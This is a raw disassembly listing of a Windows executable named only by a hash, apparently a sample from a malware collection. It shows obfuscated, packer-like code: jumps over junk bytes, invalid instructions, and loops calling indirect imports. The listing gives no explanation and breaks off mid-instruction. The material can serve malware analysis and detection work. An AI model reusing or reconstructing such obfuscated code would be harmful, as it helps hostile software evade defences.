
e604b11abc3e62dd6e683e43fa5f4f9c17ee292c602351f01273b795c241e074.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0x1ec1888c
  40101f:	fidivr DWORD PTR [esi+0x7e]
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	rol    eax,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	push   cs
  401035:	xchg   ecx,eax
  401036:	add    BYTE PTR [edi],cl
  401038:	xor    ecx,DWORD PTR [edi]
  40103a:	rcr    BYTE PTR [eax],0xc7
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x51dfb59e
  4010d2:	fistp  QWORD PTR [eax+0x18d41f42]
  4010d8:	(bad)  
  4010d9:	or     al,0xd7
  4010db:	cmp    eax,0xc80e15e6
  4010e0:	bound  esp,QWORD PTR [ecx]
  4010e2:	pop    ds
  4010e3:	aaa    
  4010e4:	sahf   
  4010e5:	mov    ch,0x1a
  4010e7:	mov    bh,0x11
  4010e9:	push   ds
  4010ea:	pop    ecx
  4010eb:	int    0x1c
  4010ed:	js     0x4010bb
  4010ef:	popf   
  4010f0:	or     eax,DWORD PTR [ebx-0x78]
  4010f3:	adc    al,0x15
  4010f5:	push   eax
  4010f6:	push   edi
  4010f7:	mov    edx,0xec54d565
  4010fc:	adc    eax,0xeba6eccf
  401101:	enter  0xe522,0xcd
  401105:	jno    0x4010bc
  401107:	sbb    al,0x43
  401109:	pop    esp
  40110a:	stos   DWORD PTR es:[edi],eax
  40110b:	outs   dx,BYTE PTR ds:[esi]
  40110c:	and    edx,esp
  40110e:	dec    esi
  40110f:	sbb    ch,bl
  401111:	ret    0xe5cb
  401114:	test   BYTE PTR [esi+0x53aeb67e],al
  40111a:	push   esi
  40111b:	mov    bh,0x9a
  40111d:	mov    bl,0xe0
  40111f:	pop    esp
  401120:	jl     0x401133
  401122:	or     al,BYTE PTR [edx-0x4a]
  401125:	mov    esi,esp
  401127:	out    0xe2,al
  401129:	aam    0xaf
  40112b:	clc    
  40112c:	mov    ds:0x90619d56,al
  401131:	cmp    esp,DWORD PTR [ebx+0x5c]
  401134:	dec    eax
  401135:	fiadd  DWORD PTR [esi]
  401137:	jnp    0x401188
  401139:	out    0xf7,al
  40113b:	fsubr  QWORD PTR [edx+0x5accbc0b]
  401141:	repnz mov esp,0x1478a1a9
  401147:	lahf   
  401148:	xlat   BYTE PTR ds:[ebx]
  401149:	(bad)  
  40114a:	scas   eax,DWORD PTR es:[edi]
  40114b:	jmp    0xe0b0:0xdab3cf91
  401152:	lods   al,BYTE PTR ds:[esi]
  401153:	pop    ebx
  401154:	push   ebp
  401155:	popf   
  401156:	add    eax,ebp
  401158:	adc    eax,DWORD PTR [esi+eax*1-0x31e0dc6]
  40115f:	lock out 0x5b,al
  401162:	shr    DWORD PTR [edx],1
  401164:	xor    al,0x84
  401166:	loop   0x401196
  401168:	ja     0x4011e2
  40116a:	push   edx
  40116b:	mov    bl,0x6b
  40116d:	cdq    
  40116e:	pop    esi
  40116f:	push   esi
  401170:	out    dx,al
  401171:	aas    
  401172:	(bad)  
  401173:	mov    bl,0x0
  401175:	jnp    0x40116a
  401177:	xchg   dh,dh
  401179:	(bad)  
  40117a:	dec    eax
  40117b:	jl     0x4011d8
  40117d:	cmp    dl,BYTE PTR [ebp+0x603594f5]
  401183:	outs   dx,DWORD PTR ds:[esi]
  401184:	dec    esp
  401185:	or     BYTE PTR [eax+edi*4],bl
  401188:	pop    ecx
  401189:	mov    ds:0x614c0edc,al
  40118e:	and    DWORD PTR [edx+0x2177de6a],ecx
  401194:	ret    
  401195:	mov    BYTE PTR [ebx-0x4946ed59],bl
  40119b:	jmp    0x40118f
  40119d:	repz cld 
  40119f:	inc    esi
  4011a0:	pushf  
  4011a1:	in     eax,dx
  4011a2:	sbb    BYTE PTR [ecx],bh
  4011a4:	mov    cl,0x98
  4011a6:	cwde   
  4011a7:	clc    
  4011a8:	call   0x5d7:0xfef69318
  4011af:	pop    ebx
  4011b0:	xchg   eax,ebx
  4011b2:	push   esp
  4011b3:	cmp    DWORD PTR ds:[si+0x2d],edi
  4011b8:	les    edx,FWORD PTR [ebx]
  4011ba:	pop    ds
  4011bb:	pop    ebx
  4011bc:	fstp   DWORD PTR [esi+ebp*1-0x2294ad53]
  4011c3:	fs sahf 
  4011c5:	mov    bl,0x1a
  4011c7:	jp     0x401150
  4011c9:	rcr    BYTE PTR [esi],cl
  4011cb:	adc    ecx,DWORD PTR ds:0xe0458984
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x430455,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x430455
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x430455,ecx
  401209:	cmp    DWORD PTR ds:0x430455,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ec0b
  401248:	cmp    DWORD PTR ds:0x430455,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x430455
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x430455,ecx
  401262:	cmp    DWORD PTR ds:0x430455,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x43044d,0x1e
  401279:	cmp    DWORD PTR ds:0x43044d,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x43044d,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e9a7
  40129c:	mov    ecx,DWORD PTR ds:0x43044d
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x43044d,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx+0x5e06672e]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x4012d9
  4012cc:	repnz sbb al,0x71
  4012cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012d0:	leave  
  4012d1:	adc    al,0x37
  4012d3:	xor    BYTE PTR [edi],0x6e
  4012d6:	and    DWORD PTR [edx+eax*4],esp
  4012d9:	fimul  DWORD PTR [eax+0x42]
  4012dc:	je     0x401266
  4012de:	cmp    al,0xc4
  4012e0:	pop    ds
  4012e1:	mov    esp,?
  4012e3:	xchg   ebx,eax
  4012e4:	push   eax
  4012e5:	pop    ebx
  4012e6:	fild   WORD PTR [eax-0x49]
  4012e9:	mov    al,ds:0xe3c87840
  4012ee:	clc    
  4012ef:	or     al,0x35
  4012f1:	aam    0x48
  4012f3:	cmp    al,0xd9
  4012f5:	adc    BYTE PTR [eax-0x15],0xbc
  4012f9:	test   eax,0xb02f4c34
  4012fe:	jne    0x401300
  401300:	fwait
  401301:	icebp  
  401302:	xchg   edx,eax
  401303:	fbld   TBYTE PTR [ecx]
  401305:	sub    BYTE PTR [ebx+0x494aef8b],cl
  40130b:	push   es
  40130c:	(bad)  
  40130d:	stos   BYTE PTR es:[edi],al
  40130e:	mov    ch,0x92
  401310:	or     esp,ebx
  401312:	sahf   
  401313:	ins    BYTE PTR es:[edi],dx
  401314:	cs je  0x401320
  401317:	fst    DWORD PTR [esp+edi*4+0x79d4a110]
  40131e:	mov    bl,0xb6
  401320:	retf   0xf337
  401323:	rcr    bh,cl
  401325:	push   ebp
  401326:	(bad)  
  401327:	jmp    0x40137f
  401329:	adc    al,0x3e
  40132b:	loopne 0x401392
  40132d:	enter  0xafd6,0x4a
  401331:	mov    eax,0x49dc402d
  401336:	fstp   st(7)
  401338:	push   es
  401339:	or     BYTE PTR gs:[esi-0x2f108386],bh
  401340:	push   ebx
  401341:	call   0xda77:0xf465adba
  401348:	xchg   edi,eax
  401349:	mov    eax,0x97b3b23b
  40134e:	pop    es
  40134f:	scas   al,BYTE PTR es:[edi]
  401350:	push   edi
  401351:	push   esp
  401352:	fcomp  QWORD PTR [ecx+0x3c991982]
  401358:	(bad)  
  401359:	xor    dh,BYTE PTR [eax-0x67]
  40135c:	mov    al,ds:0x13bee46
  401361:	adc    bl,0xa0
  401364:	scas   eax,DWORD PTR es:[edi]
  401365:	xor    al,dh
  401367:	cld    
  401368:	es push ecx
  40136a:	outs   dx,DWORD PTR ds:[esi]
  40136b:	push   ebx
  40136c:	mov    esp,0xaf189ba4
  401371:	mov    ecx,DWORD PTR [eax-0x8]
  401374:	xchg   esi,eax
  401375:	adc    esp,DWORD PTR [edx-0xc]
  401378:	add    BYTE PTR [ebx+0x5b],dh
  40137b:	mov    cl,0xdd
  40137d:	or     eax,0x3a2c0bb6
  401382:	call   0x8007a483
  401387:	loop   0x40134c
  401389:	and    al,0x38
  40138b:	aad    0x69
  40138d:	jmp    0x56b7:0x6f5262d5
  401394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401395:	mov    ch,cl
  401397:	jne    0x40137d
  401399:	push   es
  40139a:	ins    BYTE PTR es:[edi],dx
  40139b:	pop    esp
  40139c:	cmp    bl,bh
  40139e:	add    al,bh
  4013a0:	mov    cl,ah
  4013a2:	cmp    al,0x7e
  4013a4:	arpl   WORD PTR [edi-0x71],ax
  4013a7:	push   esi
  4013a8:	test   DWORD PTR [ecx-0x48],ebp
  4013ab:	jo     0x4013d3
  4013ad:	lds    ecx,FWORD PTR [eax+ebp*2-0x65e9aca4]
  4013b4:	dec    eax
  4013b5:	js     0x401386
  4013b7:	call   DWORD PTR [ecx+0x17c3134b]
  4013bd:	out    dx,eax
  4013be:	mov    eax,ds:0xd5a4f2c6
  4013c3:	(bad)  
  4013c4:	ret    
  4013c5:	mov    dh,0xd6
  4013c7:	pop    ebp
  4013c8:	cmp    esi,edi
  4013ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013cb:	pop    es
  4013cc:	cmp    al,0x86
  4013ce:	inc    eax
  4013cf:	adc    BYTE PTR [ebx],dl
  4013d1:	in     eax,0xd3
  4013d3:	and    eax,0x27b0911d
  4013d8:	fdivp  st(1),st
  4013da:	cmp    ebx,DWORD PTR [edi+esi*8]
  4013dd:	push   ecx
  4013de:	mov    dh,0xd6
  4013e0:	or     dh,BYTE PTR [edx]
  4013e2:	xchg   ebx,eax
  4013e3:	xchg   edi,eax
  4013e4:	not    edx
  4013e6:	cmp    al,0x8b
  4013e8:	nop
  4013e9:	add    BYTE PTR [edx],ch
  4013eb:	ins    BYTE PTR es:[edi],dx
  4013ec:	mov    al,0x8f
  4013ee:	cmp    al,0x65
  4013f0:	fs sub ch,bl
  4013f3:	mov    al,ds:0xa05ebf74
  4013f8:	xchg   ebp,eax
  4013f9:	arpl   WORD PTR [edx-0x78],si
  4013fc:	xchg   ebp,eax
  4013fd:	jmp    0x264c:0xae234bfb
  401404:	adc    esp,ebx
  401406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401407:	or     edi,eax
  401409:	addr16 shl bh,cl
  40140c:	shl    BYTE PTR [ebp+0x39aba63f],0xe5
  401413:	je     0x40148c
  401415:	mov    edx,0xabb95bbe
  40141a:	xchg   DWORD PTR [edi],edi
  40141c:	mov    edx,0xca9ec298
  401421:	ds (bad) 
  401423:	(bad)  
  401425:	inc    edx
  401426:	inc    esp
  401427:	sub    dl,BYTE PTR es:[edx]
  40142a:	dec    ebp
  40142b:	adc    DWORD PTR [esi+0x554fc6d7],eax
  401431:	sub    edi,DWORD PTR [eax+0x5e]
  401434:	pop    ecx
  401435:	out    0x11,al
  401437:	in     al,0xed
  401439:	sbb    eax,0x3a72f560
  40143e:	cdq    
  40143f:	(bad)  
  401440:	ror    BYTE PTR ds:0x1651c238,1
  401446:	mov    ebp,0x4705a0f2
  40144b:	(bad)  
  40144c:	jmp    0xac63:0xd263fa44
  401453:	xchg   ebx,eax
  401454:	inc    eax
  401455:	pusha  
  401456:	das    
  401457:	arpl   WORD PTR [esp+edx*8],si
  40145a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40145b:	not    BYTE PTR [ecx]
  40145d:	or     ah,BYTE PTR [edx+0x67]
  401460:	imul   ebp,DWORD PTR [eax+0xd],0x37c248f1
  401467:	xor    al,0xea
  401469:	push   ss
  40146a:	and    eax,0x598dc69c
  40146f:	aad    0x38
  401471:	push   esi
  401472:	mov    ecx,0x8a3c
  401477:	adc    DWORD PTR ds:0x42eddb,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x430439
  40148b:	or     DWORD PTR ds:0x4304eb,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x8700fff
  4014a7:	adc    ebp,ebx
  4014a9:	ret    0x7e7d
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x40152b
  4014b2:	mov    ?,ebp
  4014b4:	inc    eax
  4014b5:	hlt    
  4014b6:	push   0xfffffff3
  4014b8:	call   0x9627:0xd34f6d05
  4014bf:	cmp    al,0xb6
  4014c1:	retf   
  4014c2:	mov    al,ds:0x167db6a2
  4014c7:	lea    esi,[ebp-0x6676a743]
  4014cd:	repnz (bad) 
  4014cf:	xor    dl,BYTE PTR [esi+0x1422a3ba]
  4014d5:	mov    esi,fs
  4014d7:	clc    
  4014d8:	xor    BYTE PTR [ebp-0x4b8ba6fb],ah
  4014de:	push   es
  4014df:	ja     0x401487
  4014e1:	enter  0xbc3c,0xcb
  4014e5:	stos   BYTE PTR es:[edi],al
  4014e6:	sbb    eax,0x258f86d
  4014eb:	inc    eax
  4014ec:	jmp    0x5e3f:0x59a98d6
  4014f3:	ds mov edx,0x25f59df4
  4014f9:	mov    dh,BYTE PTR [edx]
  4014fb:	cmp    ah,dl
  4014fd:	or     al,0x28
  4014ff:	or     eax,0x643c66a2
  401504:	fwait
  401505:	xlat   BYTE PTR ds:[ebx]
  401506:	mov    edi,0x80c91955
  40150b:	sub    cl,bh
  40150d:	(bad)  
  40150e:	loopne 0x4014c5
  401510:	inc    esi
  401511:	xchg   DWORD PTR [ebx],edx
  401513:	mov    DWORD PTR [esi+0x31],ebx
  401516:	or     DWORD PTR [ebx],edx
  401518:	or     ebp,eax
  40151a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40151b:	push   esp
  40151c:	fdivr  QWORD PTR [esi]
  40151e:	cdq    
  40151f:	pop    eax
  401520:	pop    es
  401521:	sbb    bl,BYTE PTR [ecx+ebp*4+0x498da129]
  401528:	push   0x7671de1a
  40152d:	dec    eax
  40152e:	xchg   ebp,eax
  40152f:	enter  0xf918,0x88
  401533:	pop    ebp
  401534:	mov    ebx,0xe77d402b
  401539:	aam    0x97
  40153b:	aas    
  40153c:	icebp  
  40153d:	xchg   ebx,eax
  40153e:	or     ch,dl
  401540:	push   ss
  401541:	cmp    esi,DWORD PTR [ecx-0x503e974c]
  401547:	stc    
  401548:	clc    
  401549:	mov    esi,0x5691a4d1
  40154e:	pop    edi
  40154f:	jp     0x40153c
  401551:	push   0xffffffbb
  401553:	test   BYTE PTR [edx+0x49fb1d4],0xcd
  40155a:	std    
  40155b:	pop    ebp
  40155c:	(bad)  
  40155d:	leave  
  40155e:	pusha  
  40155f:	jnp    0x40157d
  401561:	sub    ecx,ebp
  401563:	unpckhps xmm6,xmm3
  401566:	adc    al,BYTE PTR [esi+eiz*4+0x60c6b7e2]
  40156d:	jmp    0x9075:0xb5b3eab9
  401574:	or     BYTE PTR [eax],bl
  401576:	aad    0xb
  401578:	in     al,dx
  401579:	sbb    al,0x11
  40157b:	pop    ebp
  40157c:	(bad)  
  40157d:	jl     0x401576
  40157f:	fbld   TBYTE PTR [edi]
  401581:	inc    eax
  401582:	push   cs
  401583:	jp     0x401543
  401585:	or     eax,0x1044c282
  40158a:	adc    eax,0xf9d0b1f3
  40158f:	mov    ch,0x89
  401591:	adc    BYTE PTR [ebx-0xf],0xaa
  401595:	push   edi
  401596:	add    eax,0xf9c8f25a
  40159b:	imul   edx,DWORD PTR [ecx],0xffffffcb
  40159e:	add    al,0x89
  4015a0:	jbe    0x40161f
  4015a2:	sbb    eax,0x2c8a7a7c
  4015a7:	retf   0x68e7
  4015aa:	and    eax,0xe98cf9c3
  4015af:	sbb    al,0xaa
  4015b1:	clc    
  4015b2:	pop    ebx
  4015b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b4:	(bad)  [esi-0x10]
  4015b7:	retf   0x7170
  4015ba:	ret    0xe18d
  4015bd:	sbb    eax,0x8cb5b0d9
  4015c2:	sbb    edx,DWORD PTR [edi]
  4015c4:	mov    dh,0x2d
  4015c6:	out    0x73,eax
  4015c8:	jnp    0x4015c1
  4015ca:	xor    dl,BYTE PTR [esi+0x4ec58e3a]
  4015d0:	out    0x84,al
  4015d2:	cwde   
  4015d3:	cmp    DWORD PTR [ebx-0x34],esp
  4015d6:	sub    cl,cl
  4015d8:	or     edx,ecx
  4015da:	inc    esi
  4015db:	shr    BYTE PTR [ebx+edi*2-0x9273cef],cl
  4015e2:	test   BYTE PTR [edx+0x76],cl
  4015e5:	adc    al,0xe2
  4015e7:	sbb    edx,DWORD PTR [ebp+0x2]
  4015ea:	dec    edi
  4015eb:	jg     0x40165e
  4015ed:	out    dx,al
  4015ee:	out    0xfe,al
  4015f0:	aam    0x2a
  4015f2:	adc    ecx,edx
  4015f4:	add    BYTE PTR [esp+eax*4],al
  4015f7:	jmp    0x58f22a1d
  4015fc:	adc    edx,ebx
  4015fe:	clc    
  4015ff:	and    BYTE PTR [edx],ch
  401601:	int    0x1c
  401603:	or     BYTE PTR ds:0xeae5049f,ah
  401609:	gs ret 0x3e99
  40160d:	sbb    al,0xe3
  40160f:	xchg   ecx,esi
  401611:	rcl    ebx,0x1c
  401614:	jmp    0xeff2:0xf161fcd0
  40161b:	imul   esp,DWORD PTR [edx],0xffffff93
  40161e:	fmul   DWORD PTR [esi+0x5b]
  401621:	(bad)  
  401622:	pusha  
  401623:	stos   DWORD PTR es:[edi],eax
  401624:	and    ch,BYTE PTR [esi-0x2986f575]
  40162a:	neg    BYTE PTR [edi]
  40162c:	jno    0x4015d0
  40162e:	stos   BYTE PTR es:[edi],al
  40162f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401630:	mov    ds:0xce3818d0,eax
  401635:	xor    DWORD PTR [edi],0x52
  401638:	add    dh,BYTE PTR [eax-0x7f]
  40163b:	jmp    0x40164d
  40163d:	mov    edi,0xe1a2e6b9
  401642:	psrlq  mm7,QWORD PTR ds:0x296c4c24
  401649:	sahf   
  40164a:	jge    0x4015f0
  40164c:	call   0x38e7bb3f
  401651:	out    dx,eax
  401652:	jne    0x401612
  401654:	into   
  401655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401656:	ins    BYTE PTR es:[edi],dx
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	adc    edi,eax
  40166d:	hlt    
  40166e:	cmp    al,0x6c
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x401629
  401678:	bound  esp,QWORD PTR [edi-0x4]
  40167b:	add    eax,0x6f12cd8f
  401680:	or     al,0x47
  401682:	(bad)
  401686:	dec    esp
  401687:	inc    eax
  401688:	add    BYTE PTR [edx-0x5d],0xa8
  40168c:	add    eax,0xd1800de1
  401691:	mov    esp,0x6f8c4579
  401696:	mov    WORD PTR [eax+0xeda35e5],fs
  40169c:	push   edi
  40169d:	sub    BYTE PTR [ebx-0x16d5f52b],bh
  4016a3:	dec    ebx
  4016a4:	adc    ebx,DWORD PTR [ecx]
  4016a6:	jns    0x401695
  4016a8:	push   ds
  4016a9:	adc    eax,0xc1518407
  4016ae:	mov    ecx,0xbf452523
  4016b3:	push   ss
  4016b4:	jne    0x40170c
  4016b6:	int3   
  4016b7:	fistp  WORD PTR [esi+0x23974d5e]
  4016bd:	add    ecx,esp
  4016bf:	aam    0x1a
  4016c1:	push   ebx
  4016c2:	out    0x5f,al
  4016c4:	or     edx,DWORD PTR [edx]
  4016c6:	mov    ebx,0x2a719e0b
  4016cb:	or     DWORD PTR [ecx],ebp
  4016cd:	add    DWORD PTR [ecx],esi
  4016cf:	push   0x6b7e4380
  4016d4:	dec    ebp
  4016d5:	loopne 0x401700
  4016d7:	pop    esp
  4016d8:	rcr    dl,cl
  4016da:	xor    esp,DWORD PTR [esi]
  4016dc:	sbb    DWORD PTR ds:0xf4f94a0c,edx
  4016e2:	ins    BYTE PTR es:[edi],dx
  4016e3:	arpl   WORD PTR [ebx-0x28c7ecaa],bp
  4016e9:	stos   DWORD PTR es:[edi],eax
  4016ea:	scas   eax,DWORD PTR es:[edi]
  4016eb:	mov    dl,0x77
  4016ed:	jmp    0x1fb4:0x27f7007
  4016f4:	sub    esp,0xfdf806b6
  4016fa:	cmp    eax,0x1d2eae2b
  4016ff:	shl    BYTE PTR [ecx+0x60],1
  401702:	xor    eax,0x6a3744d6
  401707:	ret    
  401708:	retf   
  401709:	mov    ds:0x5424a4f1,al
  40170e:	jle    0x401699
  401710:	jle    0x401704
  401712:	es popa 
  401714:	in     al,dx
  401715:	mov    DWORD PTR [ebx-0x5084908a],ecx
  40171b:	call   0x3cd3:0xb7f71739
  401722:	sbb    DWORD PTR [esi-0x50],0xfffffff1
  401726:	pop    esp
  401727:	lock repz test al,0x6e
  40172b:	mov    edx,0xd08c23bd
  401730:	psubb  mm1,QWORD PTR [esp+ebp*4+0x59]
  401735:	test   bl,al
  401737:	xor    eax,0xadad960e
  40173c:	lods   al,BYTE PTR ds:[esi]
  40173d:	and    al,BYTE PTR [edx-0x6b]
  401740:	jl     0x401781
  401742:	int    0xba
  401744:	jo     0x401736
  401746:	jno    0x401700
  401748:	arpl   WORD PTR [esi-0x50a2194f],ax
  40174e:	sbb    DWORD PTR [ecx],ecx
  401750:	loopne 0x401723
  401752:	inc    ebp
  401753:	sub    DWORD PTR [ebx-0x43c2ea7c],ebp
  401759:	retf   0x98b2
  40175c:	stos   DWORD PTR es:[edi],eax
  40175d:	or     eax,0x34de374d
  401762:	fs mov esp,0x86808550
  401768:	stos   DWORD PTR es:[edi],eax
  401769:	mov    es,WORD PTR [edx+ebx*8]
  40176c:	mov    ebx,0x8406f3dd
  401771:	jmp    0x975c:0x45768714
  401778:	in     eax,0x5e
  40177a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40177b:	pop    ss
  40177c:	gs ins BYTE PTR es:[edi],dx
  40177e:	sbb    al,0xba
  401780:	das    
  401781:	mov    ecx,0xb51d2bf1
  401786:	push   ds
  401787:	ins    BYTE PTR es:[edi],dx
  401788:	xchg   ebx,eax
  401789:	push   esp
  40178a:	out    dx,al
  40178b:	inc    esi
  40178c:	jecxz  0x40179f
  40178e:	jmp    0x40178e
  401790:	retf   
  401791:	popf   
  401792:	mov    esp,0x5b5576f9
  401797:	sbb    BYTE PTR [esi-0x24],al
  40179a:	rcl    BYTE PTR [esi+0x8],0xd3
  40179e:	pandn  mm0,QWORD PTR [edi+ebp*4-0x7a]
  4017a3:	daa    
  4017a4:	mov    bh,0x0
  4017a6:	fistp  DWORD PTR [esp+eiz*2-0x5]
  4017aa:	(bad)  
  4017ab:	jnp    0x401787
  4017ad:	add    eax,0xe4ac285e
  4017b2:	add    edi,DWORD PTR [eax]
  4017b4:	dec    ebx
  4017b5:	xor    edi,DWORD PTR [ecx]
  4017b7:	inc    edi
  4017b8:	jne    0x4017cb
  4017ba:	cmp    al,0xf1
  4017bc:	jecxz  0x401753
  4017be:	imul   ecx,DWORD PTR [esi+ecx*1+0x2],0xffffffa9
  4017c3:	sub    edx,eax
  4017c5:	cmp    al,dh
  4017c7:	aad    0x8a
  4017c9:	dec    esi
  4017ca:	push   esi
  4017cb:	fisubr DWORD PTR [ebp+esi*2-0x63]
  4017cf:	ins    BYTE PTR es:[edi],dx
  4017d0:	lds    ecx,FWORD PTR [edi-0x89b644a]
  4017d6:	lods   eax,DWORD PTR ds:[esi]
  4017d7:	int    0x7
  4017d9:	ss lahf 
  4017db:	mov    edi,0xeb973682
  4017e0:	test   BYTE PTR [edi-0x667a611a],ch
  4017e6:	ficom  WORD PTR [ecx]
  4017e8:	lahf   
  4017e9:	mov    al,ds:0x7e84f085
  4017ee:	fstp   QWORD PTR [edx-0x7d]
  4017f1:	xchg   ebp,eax
  4017f2:	xor    eax,0xcfdf2bd5
  4017f7:	lods   al,BYTE PTR ds:[esi]
  4017f8:	mov    edi,ebp
  4017fa:	jg     0x401855
  4017fc:	dec    esp
  4017fd:	mov    ecx,0xbb58668f
  401802:	mov    eax,ds:0xb7a5002
  401807:	sub    al,0xd7
  401809:	xor    BYTE PTR [edx],bl
  40180b:	adc    eax,0x1449fbec
  401810:	xor    ch,BYTE PTR [ebx-0x405a51f0]
  401816:	push   ss
  401817:	pushf  
  401818:	nop
  401819:	popf   
  40181a:	mov    ?,edx
  40181c:	mov    BYTE PTR [edi+0x3b02],bh
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x430455,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x430459,0x0
  40183c:	mov    esi,DWORD PTR ds:0x430459
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x430459,esi
  401849:	cmp    DWORD PTR ds:0x430459,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42ea93
  401863:	cmp    DWORD PTR ds:0x430459,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x4304e3,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x4304e3
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x4304e3,esi
  401898:	cmp    DWORD PTR ds:0x4304e3,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x4304e3,0x8
